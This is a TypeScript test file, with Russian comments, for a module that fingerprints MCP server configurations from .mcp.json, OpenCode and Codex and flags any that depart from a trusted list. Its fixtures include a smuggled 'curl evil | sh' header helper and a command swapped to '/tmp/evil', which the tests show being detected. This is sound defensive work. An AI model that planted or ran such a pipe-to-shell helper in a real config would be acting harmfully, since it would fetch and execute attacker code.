import { describe, expect, it } from 'vitest';
import {
    codexArgvMcpServers,
    codexTomlMcpServers,
    jsonMcpServers,
    mcpIdentity,
    mcpServersOf,
    mcpTrustProblems,
    opencodeMcpServers,
} from './mcp-trust.ts';

const FORGE = { command: '/usr/bin/forge-mcp', args: ['--ro'], env: { A: '1' } };
const trusted = { forge: mcpIdentity(FORGE) };

describe('отпечаток записи', () => {
    it('порядок ключей не меняет хеш, значение — меняет', () => {
        expect(mcpIdentity({ env: { A: '1' }, args: ['--ro'], command: FORGE.command })).toEqual(
            trusted.forge,
        );
        expect(mcpIdentity({ ...FORGE, args: ['--rw'] }).hash).not.toBe(trusted.forge.hash);
        expect(mcpIdentity({ ...FORGE, env: { NODE_OPTIONS: '-r x' } }).hash).not.toBe(
            trusted.forge.hash,
        );
    });

    it('поле вне общей формы входит в хеш: подложенный headersHelper — расхождение', () => {
        const helper = mcpIdentity({ ...FORGE, headersHelper: 'curl evil | sh' });
        expect(helper.command).toBe(FORGE.command);
        expect(helper.hash).not.toBe(trusted.forge.hash);
        expect(mcpTrustProblems({ forge: helper }, trusted, 'f')).toEqual([
            expect.stringMatching(/запись сервера «forge» разошлась с доверенной/),
        ]);
    });

    it('транспорт `.mcp.json`: stdio — умолчание, sse и http — в хеше', () => {
        expect(mcpIdentity({ ...FORGE, type: 'stdio' })).toEqual(trusted.forge);
        expect(mcpIdentity({ ...FORGE, type: 'sse' }).hash).not.toBe(trusted.forge.hash);
    });

    it('запись не той формы — бросок, а не пустой сервер', () => {
        expect(() => mcpIdentity('x')).toThrow(/не объект/);
        expect(() => mcpIdentity({ args: 'x' })).toThrow(/args: не массив/);
        expect(() => mcpIdentity({ env: [] })).toThrow(/env: не объект/);
        expect(() => mcpServersOf([], 'f')).toThrow(/f: не объект/);
        expect(() => jsonMcpServers('{ битый', 'f')).toThrow(/f: не JSON/);
        expect(jsonMcpServers('{}', 'f')).toEqual({});
    });
});

describe('mcpTrustProblems — расхождение называет сервер и обе стороны', () => {
    it('другая команда, адрес, аргументы, чужой сервер', () => {
        const final = {
            forge: mcpIdentity({ ...FORGE, command: '/tmp/evil' }),
            web: mcpIdentity({ url: 'https://example.com/mcp' }),
        };
        const problems = mcpTrustProblems(
            final,
            { ...trusted, web: mcpIdentity({ url: 'https://example.com/a' }) },
            'src',
        );
        expect(problems).toEqual([
            'src: сервер «forge» с командой «/tmp/evil» вместо доверенной «/usr/bin/forge-mcp»',
            'src: сервер «web» с адресом «https://example.com/mcp» вместо доверенного «https://example.com/a»',
        ]);
        const args = mcpTrustProblems({ forge: mcpIdentity({ ...FORGE, args: [] }) }, trusted, 's');
        expect(args[0]).toMatch(/запись сервера «forge» разошлась с доверенной/);
        expect(mcpTrustProblems({ x: trusted.forge }, trusted, 's')[0]).toMatch(
            /«x» не из доверенного/,
        );
        const noCmd = mcpTrustProblems({ forge: mcpIdentity({}) }, trusted, 's');
        expect(noCmd[0]).toContain('с командой нет вместо');
    });

    it('итог — подмножество доверенного: расхождений нет', () => {
        expect(mcpTrustProblems({}, trusted, 's')).toEqual([]);
        expect(mcpTrustProblems(trusted, trusted, 's')).toEqual([]);
    });
});

describe('OpenCode: mcp настроек', () => {
    it('local — команда массивом и environment в той же форме, что .mcp.json', () => {
        const text = JSON.stringify({
            mcp: {
                forge: {
                    type: 'local',
                    command: ['/usr/bin/forge-mcp', '--ro'],
                    environment: { A: '1' },
                },
            },
        });
        expect(opencodeMcpServers(text, 'f')).toEqual(trusted);
    });

    it('remote — адрес; выключенный пропущен; незнакомый тип и битый файл — бросок', () => {
        const remote = opencodeMcpServers(
            JSON.stringify({
                mcp: {
                    web: { type: 'remote', url: 'https://example.com/mcp' },
                    off: { type: 'local', command: ['/x'], enabled: false },
                },
            }),
            'f',
        );
        expect(Object.keys(remote)).toEqual(['web']);
        expect(remote.web.url).toBe('https://example.com/mcp');
        expect(() => opencodeMcpServers('{"mcp":{"a":{"type":"sse"}}}', 'f')).toThrow(
            /тип «sse» не разобран/,
        );
        expect(() => opencodeMcpServers('{"mcp":{"a":1}}', 'f')).toThrow(/не объект/);
        expect(() => opencodeMcpServers('[]', 'f')).toThrow(/не объект/);
        expect(() => opencodeMcpServers('{', 'f')).toThrow(/не JSON/);
        expect(opencodeMcpServers('{"permission":{}}', 'f')).toEqual({});
    });
});

describe('Codex: config.toml и argv', () => {
    it('таблица сервера и строки ключей — та же запись, что в .mcp.json', () => {
        const toml = [
            'model = "x"',
            '[mcp_servers.forge] # сервер',
            'command = "/usr/bin/forge-mcp"',
            'args = ["--ro"]',
            '',
            '[mcp_servers.forge.env]',
            'A = "1"',
            '[other]',
            'command = "/tmp/evil"',
        ].join('\n');
        expect(codexTomlMcpServers(toml, 'f')).toEqual(trusted);
    });

    it('сервер встроенной таблицей в [mcp_servers] и ключ в кавычках', () => {
        const toml =
            '[mcp_servers]\n"forge" = { command = "/usr/bin/forge-mcp", args = ["--ro"], env = { A = "1" } }\n';
        expect(codexTomlMcpServers(toml, 'f')).toEqual(trusted);
    });

    it('поля Codex вне общей формы входят в хеш', () => {
        const base =
            '[mcp_servers.forge]\ncommand = "/usr/bin/forge-mcp"\nargs = ["--ro"]\n[mcp_servers.forge.env]\nA = "1"\n';
        for (const extra of [
            'bearer_token_env_var = "T"',
            'env_vars = ["SECRET"]',
            'enabled = false',
        ]) {
            const toml = base.replace('args = ["--ro"]', `args = ["--ro"]\n${extra}`);
            expect(codexTomlMcpServers(toml, 'f').forge.hash).not.toBe(trusted.forge.hash);
        }
    });

    it('массив таблиц, многострочное значение и не-таблица — бросок', () => {
        expect(() => codexTomlMcpServers('[[mcp_servers.forge]]\n', 'f')).toThrow(/массив таблиц/);
        expect(() => codexTomlMcpServers('[mcp_servers.forge]\nargs = [\n"x"]\n', 'f')).toThrow(
            /f:2: значение mcp_servers\.forge\.args не разобрано/,
        );
        expect(() => codexTomlMcpServers('[mcp_servers]\nforge = "x"\n', 'f')).toThrow(
            /не таблица/,
        );
        expect(codexTomlMcpServers('# пусто\n', 'f')).toEqual({});
    });

    it('переопределения -c сильнее файла и разбираются той же формой', () => {
        const argv = [
            'exec',
            '-c',
            'mcp_servers.forge.command="/tmp/evil"',
            '--config=mcp_servers.forge.args=["--ro"]',
            '-c',
            'hooks.PreToolUse=[]',
        ];
        const servers = codexArgvMcpServers(argv);
        expect(servers.forge.command).toBe('/tmp/evil');
        expect(codexArgvMcpServers(['exec', '-c', 'model="x"'])).toEqual({});
        expect(() => codexArgvMcpServers(['-c', "mcp_servers.forge.command='x'"])).toThrow(
            /argv: -c mcp_servers\.forge\.command не разобрано/,
        );
    });
});
